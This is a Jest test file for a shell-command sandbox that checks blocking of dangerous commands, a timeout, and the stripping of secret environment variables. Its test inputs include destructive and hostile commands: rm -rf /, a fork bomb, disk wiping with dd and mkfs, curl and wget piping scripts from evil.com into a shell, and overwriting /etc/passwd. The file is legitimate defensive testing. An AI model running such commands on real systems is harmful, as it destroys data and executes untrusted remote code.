const { safExec, BLOCKED_PATTERNS, filterEnv } = require('../core/sandbox');

describe('sandbox', () => {
  describe('safExec - safe commands', () => {
    test('echo passes through', () => {
      const result = safExec('echo hello');
      expect(result.ok).toBe(true);
      expect(result.output.trim()).toBe('hello');
    });

    test('ls passes through', () => {
      const result = safExec('ls /tmp');
      expect(result.ok).toBe(true);
    });

    test('respects cwd option', () => {
      const result = safExec('pwd', { cwd: '/tmp' });
      expect(result.ok).toBe(true);
      expect(result.output.trim()).toBe('/tmp');
    });
  });

  describe('safExec - blocked commands', () => {
    test('blocks rm -rf /', () => {
      const result = safExec('rm -rf /');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks rm -f /', () => {
      const result = safExec('rm -f /');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks fork bomb', () => {
      const result = safExec(':(){ :|:& };:');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/fork bomb/);
    });

    test('blocks dd to device', () => {
      const result = safExec('dd if=/dev/zero of=/dev/sda');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks mkfs', () => {
      const result = safExec('mkfs.ext4 /dev/sda1');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks curl pipe to sh', () => {
      const result = safExec('curl http://evil.com/script.sh | sh');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks wget pipe to bash', () => {
      const result = safExec('wget http://evil.com/script.sh | bash');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks shutdown', () => {
      const result = safExec('shutdown -h now');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks reboot', () => {
      const result = safExec('reboot');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });

    test('blocks overwrite /etc/passwd', () => {
      const result = safExec('echo root > /etc/passwd');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Blocked/);
    });
  });

  describe('safExec - allows safe operations', () => {
    test('allows cat of specific files', () => {
      const result = safExec('cat /dev/null; echo ok');
      expect(result.ok).toBe(true);
      expect(result.output).toContain('ok');
    });
  });

  describe('safExec - timeout', () => {
    test('times out long commands', () => {
      const result = safExec('sleep 30', { timeout: 500 });
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/Timed out|SIGTERM|killed|ETIMEDOUT/i);
    });
  });

  describe('filterEnv', () => {
    test('strips secret-related vars', () => {
      const env = {
        PATH: '/usr/bin',
        HOME: '/root',
        OPENAI_API_KEY: 'sk-secret',
        MY_SECRET: 'hidden',
        GITHUB_TOKEN: 'ghp_xxx',
        DB_PASSWORD: 'pass123',
        NORMAL_VAR: 'keep-me',
      };
      const filtered = filterEnv(env);
      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.HOME).toBe('/root');
      expect(filtered.OPENAI_API_KEY).toBeUndefined();
      expect(filtered.MY_SECRET).toBeUndefined();
      expect(filtered.GITHUB_TOKEN).toBeUndefined();
      expect(filtered.DB_PASSWORD).toBeUndefined();
      expect(filtered.NORMAL_VAR).toBe('keep-me');
    });

    test('always keeps PATH, HOME, USER, LANG, TERM', () => {
      const env = {
        PATH: '/usr/bin',
        HOME: '/root',
        USER: 'root',
        LANG: 'en_US.UTF-8',
        TERM: 'xterm',
        SECRET_AUTH_TOKEN: 'xxx',
      };
      const filtered = filterEnv(env);
      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.HOME).toBe('/root');
      expect(filtered.USER).toBe('root');
      expect(filtered.LANG).toBe('en_US.UTF-8');
      expect(filtered.TERM).toBe('xterm');
      expect(filtered.SECRET_AUTH_TOKEN).toBeUndefined();
    });
  });

  describe('BLOCKED_PATTERNS', () => {
    test('has reasonable number of patterns', () => {
      expect(BLOCKED_PATTERNS.length).toBeGreaterThan(8);
    });

    test('each pattern has label and regex', () => {
      for (const bp of BLOCKED_PATTERNS) {
        expect(bp.pattern).toBeInstanceOf(RegExp);
        expect(typeof bp.label).toBe('string');
      }
    });
  });
});
